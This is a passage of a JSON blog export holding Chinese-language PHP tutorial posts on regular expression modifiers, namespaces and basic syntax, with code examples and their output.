4.$string3匹配的时候，thisisaapple到了整个正则表达示的最后，因此也是边界。所以匹配成功。\n\n我们来实验一下非词边界：\n&lt;?php\n\n$zz = '/\\Bthis/';\n\n$string1 = \"hellothis9\";\n\n//$string2 = \"hello this9\";\n//$string2 = \"this9中国万岁\";\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n总结：   1.匹配$string1成功而$string2不成功。   2.因为\\B后接的是this，所以this不能在词边界（空格和开始结尾）的位置出现。\n\n&emsp;\n9. {m}有且只能出现m次\n\n&lt;?php\n\n$zz = '/喝\\d{3}酒/';\n\n$string1 = \"喝988酒\";\n\n//$string2 = \"喝98811酒\";\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n结论：上例中\\d{3}我规定了0-9只能出现3次，多一次少一次都不行。\n\n&emsp;\n10. {n,m} 可以出现n到m次\n\n&lt;?php\n\n$zz = '/喝\\d{1,3}酒/';\n\n$string1 = \"喝9酒\";\n\n//$string2 = \"喝988酒\";\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n结论：上例中\\d{1,3}我规定了0-9只能出现1次，2次或者3次。其它次数都是错的\n\n&emsp;\n11. {m,} 至少m次，最大次数不限制\n\n&lt;?php\n\n$zz = '/喝\\d{2,}/';\n\n$string1 = \"喝9\";\n\n//$string2 = \"喝98\";\n//$string3 = \"喝98122121\";\n\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n结论：上例中\\d{2,}我规定喝后面的0-9最少出现两次，最多次数不限。因此$string1是匹配不成功的，$string2是匹配成功的。$string3是匹配成功的。\n\n&emsp;\n6. 模式修正符我们通过元字符和原子完成了正则表达示的入门。有一些特殊情况我们依然需要来处理。如果abc在第二行的开始处如何匹配？我不希望正则表达示特别贪婪的匹配全部，只匹配一部份怎么办？这个时候，我们就需要用到下面的这些模式匹配来增强正则的功能。常用的模式匹配符有：\n\n\n\n\n模式匹配符\n功能\n\n\n\n\ni\n模式中的字符将同时匹配大小写字母.\n\n\nm\n字符串视为多行\n\n\ns\n将字符串视为单行,换行符作为普通字符.\n\n\nx\n将模式中的空白忽略.\n\n\nA\n强制仅从目标字符串的开头开始匹配.\n\n\nD\n模式中的美元元字符仅匹配目标字符串的结尾.\n\n\nU\n匹配最近的字符串.\n\n\n\n模式匹配符的用法如下：/ 正则表达示/模式匹配符 &emsp;   模式匹配符是放在正则表达式的最后的。例如： /\\w+/s \n\n&emsp;\n1. i 不区分大小写\n\n&lt;?php //在后面加上了一个i \n    $pattern = '/ABC/i'; \n$string = '8988abc12313';\n$string1 = '11111ABC2222'; \nif(preg_match($pattern, $string, $matches)){\n     echo '匹配到了，结果为：'; \n    var_dump($matches); }else{\n     echo '没有匹配到';\n     }\n?>\n\n\n结论，不论是$string还是$string1全都匹配成功了。因此，在后面加上了i之后，能够不共分匹配内容的大小写。\n\n&emsp;\n2. m 视为多行正则在匹配的时候，要匹配的目标字符串我们通常视为一行。“行起始”元字符（^）仅仅匹配字符串的起始，“行结束”元字符（$）仅仅匹配字符串的结束。当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。注意：如果要匹配的字符串中没有“\\n”字符或者模式中没有 ^ 或 $，则设定此修正符没有任何效果。我们通过实验和代码来验证一下这个特点：第一次匹配，你会发现匹配不成功：(1)↓↓\n\n&lt;?php\n$pattern = '/^a\\d+/';\n$string = \"我的未来在自己手中我需要不断的努力\na9是一个不错的字符表示\n怎么办呢，其实需要不断奋进\";\nif (preg_match($pattern, $string, $matches)) {\n    echo '匹配到了，结果为：';\n    var_dump($matches);\n} else {\n    echo '没有匹配到';\n}\n?>\n\n&emsp;第二次匹配，我们加上m 试试：(2)↓↓\n&lt;?php\n$pattern = '/^a\\d+/m';\n$string = \"我的未来在自己手中我需要不断的努力\na9是一个不错的字符表示\n怎么办呢，其实需要不断奋进\";\nif (preg_match($pattern, $string, $matches)) {\n    echo '匹配到了，结果为：';\n    var_dump($matches);\n} else {\n    echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(2) \"a9\" }\n\n\n哦耶！匹配成功了。/^a\\d+/ 匹配的内容是a9，必须得在行开始处。在第二行也被匹配成功了。\n\n&emsp;\n3. s 视为一行如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。第一次，不加模式匹配符s：(1)↓↓\n\n&lt;?php\n\n$pattern = '/新的未来.+\\d+/';\n\n$string = '新的未来\n987654321';\n\nif (preg_match($pattern, $string, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n&emsp;第二次，在正则表达示后面加上模式匹配符s:(2)↓↓\n&lt;?php\n\n$pattern = '/新的未来.+\\d+/s';\n\n$string = \"新的未来\n987654321\";\n\nif (preg_match($pattern, $string, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(22) \"新的未来 987654321\" }\n\n\n结论：\n\n因为在新的未来，未来后面有一个换行\n而.(点)是匹配非空白字符以外的所有字符。因此，第一次不成功\n第二次，加上了s模式匹配符。因为，加上后.（点）能匹配所有字符。\n\n\n&emsp;\n4. x 忽略空白字符 1. 如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略。 2. 未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。\n\n\n(1)↓↓我们先来实验一下忽略空白行等特性：\n\n&lt;?php\n\n$pattern = '/a b c /x';\n\n$string = '学英语要从abc开始';\n\nif (preg_match($pattern, $string, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(3) \"abc\" }\n\n\n这样也能匹配成功。在$pattern里面有空格，每个abc后面有一个空格。而$string里面没有空格。所以x忽略空白字符。\n\n\n(2)↓↓而第二句话从字面上比较难理解：\n\n&lt;?php\n//重点观察这一行\n$pattern = '/a b c #我来写一个注释\n/x';\n\n$string = '学英语要从abc开始';\n\nif (preg_match($pattern, $string, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(3) \"abc\" }\n\n\n结果也匹配成功了！我们发现，x的第二个特性是忽略：#字符和下一个换行符之间的字符也被忽略。\n\n&emsp;\n5. e 将匹配项找出来，进行替换e模式也叫逆向引用。主要的功能是将正则表达式括号里的内容取出来，放到替换项里面替换原字符串。使用这个模式匹配符前必须要使用到preg_replace()。mixed preg_replace ( mixed $正则表达式 , mixed $用于取代字符串的字串 , mixed $目标字符串)preg_replace的功能：使用正则表达式 ，找到目标字符串。然后用’用于取代字符串的字串’进行替换。\n\n在正式讲解前我们回顾一下之前的知识，我们故意的把每个要匹配的原子外面都加上括号：↓↓\n&lt;?php\n//加上了括号\n$pattern = '/(\\d+)([a-z]+)(\\d+)/';\n\n$string = '987abc321';\n\nif (preg_match($pattern, $string, $match)) {\n   echo '匹配到了，结果为：';\n   var_dump($match);\n\n} else {\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(4) { [0]=> string(9) \"987abc321\" [1]=> string(3) \"987\" [2]=> string(3) \"abc\" [3]=> string(3) \"321\" }\n\n\n这是我们之前讲括号的时候：匹配到的内容外面有括号。会把括号里面的内容，也放到数组的元素里面。如图中的：987、abc、321。\n\n&emsp;我们接下来看正则表达示中的e模式：↓↓\n&lt;?php\n$string = \"{April 15, 2003}\";\n\n//'w'匹配字母，数字和下划线，'d'匹配0-99数字，'+'元字符规定其前导字符必须在目标对象中连续出现一次或多次\n$pattern = \"/{(\\w+) (\\d+), (\\d+)}/i\";\n\n$replacement = \"\\$2\";\n\n//字符串被替换为与第 n 个被捕获的括号内的子模式所匹配的文本\necho preg_replace($pattern, $replacement, $string);\n\n?>\n\n运行结果：\n15\n\n\n\n结论：\n\n上例中\\$2 指向的是正则表达示的第一个(\\d+)。相当于把15又取出来了\n替换的时候，我写上\\$2。将匹配项取出来，用来再次替换匹配的结果。\n\n&emsp;\n6. U 贪婪模式控制正则表达式默认是贪婪的，也就是尽可能的最大限度匹配。\n\n我们来看看正则表达示是如何贪婪的：↓↓\n&lt;?php\n$pattern = '/&lt;div>.*&lt;\\/div>/';\n\n$string = \"&lt;div>你好&lt;/div>&lt;div>我是&lt;/div>\";\n\nif (preg_match($pattern, $string, $match)) {\n   echo '匹配到了，结果为：';\n   var_dump($match);\n} else {\n   echo '没有匹配到';\n}\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(34) \"\n你好\n我是\n\" }\n?>\n\n\n我们来看看结果，得到如下结论。它从“你好”直接匹配到了“我是”。进行了最大范围的匹配。\n\n&emsp;同样一段代码我们再加大写的U，再看看效果：↓↓\n&lt;?php\n$pattern = '/&lt;div>.*&lt;\\/div>/U';\n\n$string = \"&lt;div>你好&lt;/div>&lt;div>我是&lt;/div>\";\n\nif (preg_match($pattern, $string, $match)) {\n   echo '匹配到了，结果为：';\n   var_dump($match);\n} else {\n   echo '没有匹配到';\n}\n\n?>\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(17) \"\n你好\n\" }\n\n\n我们发现，只匹配出来了：&lt;div>你好&lt;/div>这样，把正则的贪婪特性取消掉。让它找到了最近的匹配，就OK了。\n\n&emsp;\n7. A 从目标字符串的开头开始匹配此模式类似于元字符中的^（抑扬符）效果。\n\n&lt;?php\n\n$pattern = '/this/A';\n\n$string = 'hello this is a ';\n//$string1 = 'this is a ';\n\nif (preg_match($pattern, $string, $match)) {\n   echo '匹配到了，结果为：';\n   var_dump($match);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n结论：   1.如果加A模式修正符的时候匹配不出来$string，不加时能匹配出来   2.如果加上了A模式修正符的时候能匹配出来$string1,因为必须要从开始处开始匹配\n\n&emsp;\n8. D 结束$符后不准有回车如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。\n\n&lt;?php \n$pattern = '/\\w+this$/'; \n$pattern1 = '/\\w+this$/D'; \n$string = \"hellothis \"; \nif (preg_match($pattern1, $string, $match)) {\necho '匹配到了，结果为：'; \nvar_dump($match);\n}else {\necho '没有匹配到'; \n} \n?>\n\n\n结论：1.如pattern 在匹配$string的时候，$string的字符串this后有一个回车。在没有加D匹配符的时候也能匹配成功2.如pattern 在匹配$string的时候，加上了D。$string的字符串this后有空格，匹配不成功。\n\n&emsp;\n7. 写正则的诀窍和常用正则写正则的诀窍女孩和男孩恋爱时的诀窍通常是：测试你是不是对我好一点，如果是的，咱们的关系就更好一点。而正则的诀窍和恋爱的诀窍基本一致：写一点、测一点。因为，我们需要不断的正则，用preg_match对比是不是能匹配成功。成功了，再写后面的一点。直到写完，全部匹配成功为止！例如，我要写一个邮箱的正则。我先要做的事情，将常用的邮箱格式全部列出来。例如：phpcn@php.cn &emsp; phpcn@corp.baidu.cm &emsp; phpcn@126.com  &emsp;phpcn@xxx.com  &emsp;12345@qq.com\n\n  常用的格式主要有这样一些。那我们就可以来分析：    1.先匹配@之前的字符 \\w+（因为是0-9A-Za-z_）    2.第二个跟一个@符    3.第三个再写上[a-zA-Z0-9-]+ 因为qq和126这些主域名是不能有下划线的    4.corp.baidu. 或者是126. 通常邮箱后缀都是这样的。所以我们可以写成：([a-zA-Z0-9-]+.){1,2}    5.上面的是将 . 转义，让它是本身的意思。括号重复的区间最少一次，最多两次。    6.后面接下com|cn|org|gov.cn|net|edu.cn等就可以了\n\n因此，我们的正则表达式我使用：/\\w+@([a-zA-Z0-9-]+.){1,2}(com|cn|org|gov.cn|net|edu.cn)/或/\\w+@([a-zA-Z0-9_]+)\\.(com|cn|org|gov.cn|net|edu.cn)/邮箱的正则就被我写成功了。ฅʕ•̫͡•ʔฅ\n&emsp;\n8. 常用正则函数\n\n\n函数名\n功能\n\n\n\n\npreg_filter\n执行一个正则表达式搜索和替换\n\n\npreg_grep\n返回匹配模式的数组条目\n\n\npreg_match\n执行一个正则表达式匹配\n\n\npreg_match_all\n执行一个全局正则表达式匹配\n\n\npreg_replace_callback_array\n传入数组，执行一个正则表达式搜索和替换使用回调\n\n\npreg_replace_callback\n执行一个正则表达式搜索并且使用一个回调进行替换\n\n\npreg_replace\n执行一个正则表达式的搜索和替换\n\n\npreg_split\n通过一个正则表达式分隔字符串\n\n\n\n&emsp;正则关于面试常遇到的问题面试中经常考到的几个正则达达示是：\n\n匹配邮箱\n匹配手机号\n匹配一个网址\n用正则匹配某个格式，取出某个例\n写一个采集器其他….\n\n面试的第4题和第5题我对大家不担心，因为只要大家认真学习了我给的前五节的内容。第4，5题推理就行。因为，通常在技术答题面试环节，是时候准许查手机的！  ヾ(๑╹◡╹)ﾉ”\n","thumbnail":"https://i.loli.net/2019/02/15/5c66518f6861b.jpg","plink":"https://Directoree.github.io/post/PHP-Regular-Expression/"},{"title":"PHP-命名空间","date":"2019-02-14T02:09:57.000Z","updated":"2019-02-26T08:25:51.253Z","content":"(oﾟvﾟ)ノ\n\n\n如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \\ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。对于函数和常量来说，如果当前命名空间中不存在该函数或常量，PHP 会退而使用全局空间中的函数或常量。\n\n\n\n\n名称解析遵循下列规则：\n\n对完全限定名称的函数，类和常量的调用在编译时解析。例如 new \\A\\B 解析为类 A\\B。\n所有的非限定名称和限定名称（非完全限定名称）根据当前的导入规则在编译时进行转换。例如，如果命名空间 A\\B\\C 被导入为 C，那么对 C\\D\\e() 的调用就会被转换为 A\\B\\C\\D\\e()。\n在命名空间内部，所有的没有根据导入规则转换的限定名称均会在其前面加上当前的命名空间名称。例如，在命名空间 A\\B 内部调用C\\D\\e()，则 C\\D\\e() 会被转换为 A\\B\\C\\D\\e() 。\n非限定类名根据当前的导入规则在编译时转换（用全名代替短的导入名称）。例如，如果命名空间 A\\B\\C 导入为C，则 new C() 被转换为 new A\\B\\C() 。\n在命名空间内部（例如A\\B），对非限定名称的函数调用是在运行时解析的。例如对函数 foo() 的调用是这样解析的：(1). 在当前命名空间中查找名为 A\\B\\foo() 的函数(2). 尝试查找并调用 全局(global) 空间中的函数 foo()。\n在命名空间（例如A\\B）内部对非限定名称或限定名称类（非完全限定名称）的调用是在运行时解析的。下面是调用 new C() 及 new D\\E() 的解析过程： new C()的解析:(1). 在当前命名空间中查找A\\B\\C类。(2). 尝试自动装载类A\\B\\C。new D\\E()的解析:(1). 在类名称前面加上当前命名空间名称变成：A\\B\\D\\E，然后查找该类。(2). 尝试自动装载类 A\\B\\D\\E。为了引用全局命名空间中的全局类，必须使用完全限定名称 new \\C()。\n\n\n\n\n\n&emsp;&emsp;\n对于命名空间，官方文档已经说得很详细[查看]，我在这里做了一下实践和总结。命名空间一个最明确的目的就是解决重名问题，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。这种情况下只要避免命名重复就可以解决，最常见的一种做法是约定一个前缀。例：项目中有两个模块：article和message board，它们各自有一个处理用户留言的类Comment。之后我可能想要增加对所有用户留言的一些信息统计功能，比如说我想得到所有留言的数量。这时候调用它们Comment提供的方法是很好的做法，但是同时引入各自的Comment类显然是不行的，代码会出错，在另一个地方重写任何一个Comment也会降低维护性。那这时只能重构类名，我约定了一个命名规则，在类名前面加上模块名，像这样：Article_Comment、MessageBoard_Comment可以看到，名字变得很长，那意味着以后使用Comment的时候会写上更多的代码（至少字符多了）。并且，以后如果要对各个模块增加更多的一些整合功能，或者是互相调用，发生重名的时候就需要重构名字。当然在项目开始的时候就注意到这个问题，并规定命名规则就能很好的避免这个问题。另一个解决方法可以考虑使用命名空间。\n\n&emsp;\n注明：本文提到的常量：PHP5.3开始const关键字可以用在类的外部。const和define都是用来声明常量的（它们的区别不详述），但是在命名空间里，define的作用是全局的，而const则作用于当前空间。我在文中提到的常量是指使用const声明的常量。基础：命名空间将代码划分出不同的空间（区域），每个空间的常量、函数、类（为了偷懒，我下边都将它们称为元素）的名字互不影响， 这个有点类似我们常常提到的‘封装’的概念。创建一个命名空间需要使用namespace关键字，这样：\n\n&lt;?php\n//创建一个名为'Article'的命名空间\nnamespace Article;\n?>\n\n&emsp;\n要注意的是，当前脚本文件的第一个命名空间前面不能有任何代码，下面的写法都是错误的：\n\n//例一\n//在脚本前面写了一些逻辑代码\n&lt;?php\n$path = \"/\";\nclass Comment { }\nnamespace Article;\n?>\n\n//例二\n//在脚本前面输出了一些字符\n&lt;html>&lt;/html>\n&lt;?php\nnamespace Article;\n?>\n\n为什么要说第一个命名空间呢？因为同一脚本文件中可以创建多个命名空间。下面我创建了两个命名空间，顺便为这两个空间各自添加了一个Comment类元素：\n&lt;?php\n//创建一个名为'Article'的命名空间\nnamespace Article;\n//此Comment属于Article空间的元素\nclass Comment { }\n//创建一个名为'MessageBoard'的命名空间\nnamespace MessageBoard;\n//此Comment属于MessageBoard空间的元素\nclass Comment { }\n?>\n\n&emsp;在不同空间之间不可以直接调用其它元素，需要使用命名空间的语法：\n&lt;?php\nnamespace Article;\nclass Comment { }\nnamespace MessageBoard;\nclass Comment { }\n//调用当前空间（MessageBoard）的Comment类\n$comment = new Comment();\n//调用Article空间的Comment类\n$article_comment = new \\Article\\Comment();\n?>\n\n\n\n可以看到，在MessageBoard空间中调用article空间里的Comment类时，使用了一种像文件路径的语法： \\空间名\\元素名除了类之外，对函数和常量的用法是一样的，下面我为两个空间创建了新的元素，并在MessageBoard空间中输出了它们的值。\n\n\n&lt;?php\nnamespace Article;\nconst PATH = '/article';\nfunction getCommentTotal() {\n    return 100;\n}\nclass Comment { }\n\nnamespace MessageBoard;\nconst PATH = '/message_board';\nfunction getCommentTotal() {\n    return 300;\n}\nclass Comment { }\n//调用当前空间的常量、函数和类\necho PATH; ///message_board\necho getCommentTotal(); //300\n$comment = new Comment();\n\n//调用Article空间的常量、函数和类\necho \\Article\\PATH; ///article\necho \\Article\\getCommentTotal(); //100\n$article_comment = new \\Article\\Comment();\n?>\n\n然后我的确得到了Article空间的元素数据。&emsp;\n子空间命名空间的调用语法像文件路径一样是有道理的，它允许我们自定义子空间来描述各个空间之间的关系。抱歉我忘了说，article和message board这两个模块其实都是处于同一个blog项目内。如果用命名空间来表达它们的关系，是这样：\n\n&lt;?php\n//我用这样的命名空间表示处于blog下的article模块\nnamespace Blog\\Article;\nclass Comment { }\n//我用这样的命名空间表示处于blog下的message board模块\nnamespace Blog\\MessageBoard;\nclass Comment { }\n//调用当前空间的类\n$comment = new Comment();\n//调用Blog\\Article空间的类\n$article_comment = new \\Blog\\Article\\Comment();\n?>\n\n而且，子空间还可以定义很多层次，比如说 Blog\\Article\\Archives\\Date\n&emsp;\n公共空间我有一个common_inc.php脚本文件，里面有一些好用的函数和类：\n\n&lt;?php\nfunction getIP() { }\nclass FilterXSS { }\n?>\n\n&emsp;\n在一个命名空间里引入这个脚本，脚本里的元素不会归属到这个命名空间。如果这个脚本里没有定义其它命名空间，它的元素就始终处于公共空间中：\n\n&lt;?php\nnamespace Blog\\Article;\n//引入脚本文件\ninclude './common_inc.php';\n$filter_XSS = new FilterXSS(); //出现致命错误：找不到Blog\\Article\\FilterXSS类\n$filter_XSS = new \\FilterXSS(); //正确\n?>\n\n&emsp;\n调用公共空间的方式是直接在元素名称前加 \\ 就可以了，否则PHP解析器会认为我想调用当前空间下的元素。除了自定义的元素，还包括PHP自带的元素，都属于公共空间。要提一下，其实公共空间的函数和常量不用加 \\ 也可以正常调用（不明白PHP为什么要这样做），但是为了正确区分元素，还是建议调用函数的时候加上 \\名称术语在说别名和导入之前，需要知道关于空间三种名称的术语，以及PHP是怎样解析它们的。官方文档说得非常好，我就直接拿来套了。1.非限定名称，或不包含前缀的类名称，例如 $comment = new Comment();。如果当前命名空间是Blog\\Article，Comment将被解析为Blog\\Article\\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。2.限定名称，或包含前缀的名称，例如 $comment = new Article\\Comment();。如果当前的命名空间是Blog，则Comment会被解析为Blog\\Article\\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。3.完全限定名称，或包含了全局前缀操作符的名称，例如 $comment = new \\Article\\Comment();。在这种情况下，Comment总是被解析为代码中的文字名(literal name)Article\\Comment。其实可以把这三种名称类比为文件名（例如 comment.php）、相对路径名（例如 ./article/comment.php）、绝对路径名（例如 /blog/article/comment.php），这样可能会更容易理解。我用了几个示例来表示它们：\n\n&lt;?php\n//创建空间Blog\nnamespace Blog;\nclass Comment { }\n\n//非限定名称，表示当前Blog空间\n//这个调用将被解析成 Blog\\Comment();\n$blog_comment = new Comment();\n\n//限定名称，表示相对于Blog空间\n//这个调用将被解析成 Blog\\Article\\Comment();\n$article_comment = new Article\\Comment(); //类前面没有反斜杆\\\n\n//完全限定名称，表示绝对于Blog空间\n//这个调用将被解析成 Blog\\Comment();\n$article_comment = new \\Blog\\Comment(); //类前面有反斜杆\\\n\n//完全限定名称，表示绝对于Blog空间\n//这个调用将被解析成 Blog\\Article\\Comment();\n$article_comment = new \\Blog\\Article\\Comment(); //类前面有反斜杆\\\n\n//创建Blog的子空间Article\nnamespace Blog\\Article;\n\nclass Comment { }\n?>\n\n&emsp;\n其实之前我就一直在使用非限定名称和完全限定名称，现在它们终于可以叫出它们的名称了。别名和导入别名和导入可以看作是调用命名空间元素的一种快捷方式。PHP并不支持导入函数或常量。它们都是通过使用use操作符来实现：\n\n&lt;?php\nnamespace Blog\\Article;\nclass Comment { }\n\n//创建一个BBS空间（我有打算开个论坛）\nnamespace BBS;\n\n//导入一个命名空间\nuse Blog\\Article;\n//导入命名空间后可使用限定名称调用元素\n$article_comment = new Article\\Comment();\n\n//为命名空间使用别名\nuse Blog\\Article as Arte;\n//使用别名代替空间名\n$article_comment = new Arte\\Comment();\n\n//导入一个类\nuse Blog\\Article\\Comment;\n//导入类后可使用非限定名称调用元素\n$article_comment = new Comment();\n\n//为类使用别名\nuse Blog\\Article\\Comment as Comt;\n//使用别名代替空间名\n$article_comment = new Comt();\n?>\n\n我注意到，如果导入元素的时候，当前空间有相同的名字元素将会怎样？显然结果会发生致命错误。例：\n&lt;?php\nnamespace Blog\\Article;\nclass Comment { }\n\nnamespace BBS;\nclass Comment { }\nClass Comt { }\n\n//导入一个类\nuse Blog\\Article\\Comment;\n$article_comment = new Comment(); //与当前空间的Comment发生冲突，程序产生致命错误\n\n//为类使用别名\nuse Blog\\Article\\Comment as Comt;\n$article_comment = new Comt(); //与当前空间的Comt发生冲突，程序产生致命错误\n?>\n\n&emsp;动态调用PHP提供了namespace关键字和__NAMESPACE__魔法常量动态的访问元素，__NAMESPACE__可以通过组合字符串的形式来动态访问：\n&lt;?php\nnamespace Blog\\Article;\nconst PATH = '/Blog/article';\nclass Comment { }\n//namespace关键字表示当前空间\necho namespace\\PATH; ///Blog/article\n$comment = new namespace\\Comment();\n//魔法常量__NAMESPACE__的值是当前空间名称\necho __NAMESPACE__; //Blog\\Article\n//可以组合成字符串并调用\n$comment_class_name = __NAMESPACE__ . '\\Comment';\n$comment = new $comment_class_name();\n?>\n\n字符串形式调用问题上面的动态调用的例子中，我们看到了字符串形式的动态调用方式，如果要使用这种方式要注意两个问题。\n1. 使用双引号的时候特殊字符可能被转义\n\n&lt;?php\nnamespace Blog\\Article;\nclass name { }\n//我是想调用Blog\\Article\\name\n$class_name = __NAMESPACE__ . \"\\name\"; //但是\\n将被转义为换行符\n$name = new $class_name(); //发生致命错误\n?>\n\n&emsp;\n2. 不会认为是限定名称PHP在编译脚本的时候就确定了元素所在的空间，以及导入的情况。而在解析脚本时字符串形式调用只能认为是非限定名称和完全限定名称，而永远不可能是限定名称。\n&lt;?php\nnamespace Blog;\n//导入Common类\nuse Blog\\Article\\Common;\n//我想使用非限定名称调用Blog\\Article\\Common\n$common_class_name = 'Common';\n//实际会被当作非限定名称，也就表示当前空间的Common类，但我当前类没有创建Common类\n$common = new $common_class_name(); //发生致命错误：Common类不存在\n//我想使用限定名称调用Blog\\Article\\Common\n$common_class_name = 'Article\\Common';\n//实际会被当作完全限定名称，也就表示Article空间下的Common类，但我下面只定义了Blog\\Article空间而不是Article空间\n$common = new $common_class_name(); //发生致命错误：Article\\Common类不存在\n\nnamespace Blog\\Article;\nclass Common { }\n?>\n\n","thumbnail":"https://i.loli.net/2019/02/15/5c6651eebdaec.jpg","plink":"https://Directoree.github.io/post/PHP-namespace/"},{"title":"PHP基础语法","date":"2019-02-13T14:25:29.000Z","updated":"2019-02-27T04:34:59.619Z","content":"年後の新作2.14(。・∀・)ノ   \n本文参考PHP中文网：[PHP入门教程之一周学会PHP]&emsp;[PHP入门视频教程之一周学会PHP]资料查阅：[W3shcool PHP 教程]&emsp;&emsp;\nPHP\n\n\n\n\n&emsp;\n一、 PHP基础语法1.1 PHP 语法1. PHP基础语法PHP 脚本可以放在文档中的任何位置。PHP 脚本以 尖括号、问号、PHP &lt;?php开始，以 ?&gt; 问号、尖括号结束。PHP 文件的默认文件扩展名是 “.php“。PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。\n\n&lt;?php\n     //这里是我们要写的PHP代码\n?>\n\n&emsp;\n2. PHP输出语法PHP中echo(), print(), print_r(), var_dump()的区别：echo：是PHP语句, 输出一个或多个字符串。实际上它并不是一个函数，所以不必对它使用括号，直接用echo就行。print和print_r是函数,语句没有返回值,函数可以有返回值(即便没有用)。可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。print： 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。只能打印出简单类型变量的值，如：int、string。下面的实例演示了如何使用 print 命令输出字符串（字符串可以包含 HTML 标签）：print_r()：可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\\n”。因此用var_dump()函数更适合调试。var_dump()：var_dump(传入一个变量) 输出变类型和值（最常用）。var_dump() 是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。\n\n\n\n·  echo - 可以输出一个或多个字符串·  print - 只允许输出一个字符串，返回值总为 1提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。\n\n\necho:\n&lt;?php\n    $str=\"hello world!\";\n    echo $str;\n    echo 'a','b','c';\n?>\n//运行结果：hello world!abc\n\nprint:\n&lt;?php\n print \"&lt;h2>PHP is fun!&lt;/h2>\";\n print \"Hello world!&lt;br>\";\n print \"I'm about to learn PHP!\";\n\n ?>\n\nprint_r()：\n&lt;?php\n    $age=array(18,20,24);\n    print_r($age);\n?>\n//运行结果：Array ( [0] => 18 [1] => 20 [2] => 24 )\n\nvar_dump():\n&lt;?php\n    $age=array(18,20,24);\n    var_dump($age);\n?>\n//运行结果：array(3) { [0]=> int(18) [1]=> int(20) [2]=> int(24) }\n\n注意事项：php的代码部份全部要用半角的英文、很多人容易写成全角的英文和符号造成PHP代码报错。PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。PHP代码的最后一行可以加也可不加分号。由于很多学习者特别是初学者经常犯一个毛病：写完一行代码不加分号。因此，容易报错。我们通常在公司里面规定：一行代码写完，就必须要加分号。\n\n&emsp;\n3.PHP中的注释：单行注释（只注释一行）： // 双斜杠表示单行注释,有时也用 # 表示,但用的比较少，多用 //多行注释（注释多行）： 以 /*  开始, 以*/结束代表多行注释。 \n\n&emsp;&emsp;\n1.2 PHP 变量1. PHP中的变量有几个特点：1. 必须要以$开始。如变量x必须要写成$x2. 变量的首字母不能以数字开始3. 变量的名字区分大小写4. 变量不要用特殊符号、中文，_不算特殊符号5. 变量命名要有意义（别写xxx，aaa，ccc这种 变量名）6. $ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图 \n\n变量在您第一次赋值给它的时候被创建：在下面的语句执行中，变量txt将保\n存值Hello world!，且变量 x 将保存值 5。\n&lt;?php\n $txt=\"Hello world!\";\n $x=5;\n $y=10.5;\n ?>\n\n&emsp;\n2. PHP是一门弱类型语言：在上面的实例中，我们注意到，不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。\n\n&emsp;\n3. PHP变量的作用域：local、global、static、parameter局部和全局作用域（loacal  global）：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。PHP global 关键字：global 关键字用于函数内访问全局变量。PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。\n\n&lt;?php\n $x=10;\n $y=20;\n function test(){\n     global $x,$y;      //使用global关键字\n\n     $y=$x+$y;\n }\n test();\n echo 